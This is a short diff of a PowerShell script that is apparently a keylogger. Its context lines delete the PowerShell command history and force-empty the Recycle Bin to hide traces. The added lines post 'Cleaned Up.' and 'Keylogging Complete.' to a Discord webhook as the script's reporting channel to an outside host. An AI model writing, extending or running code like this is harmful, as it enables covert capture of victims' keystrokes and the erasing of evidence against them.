@@ -80,6 +80,12 @@ try {
     Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
+    # Send cleanup message
+    Send-MessageToDiscord -WebhookUrl $webhookUrl -Message "Cleaned Up."
+    # Send completion message
+    Send-MessageToDiscord -WebhookUrl $webhookUrl -Message "Keylogging Complete."
+
+
     Write-Host "Script completed."
 } catch {
     Write-Host "Error: $_"
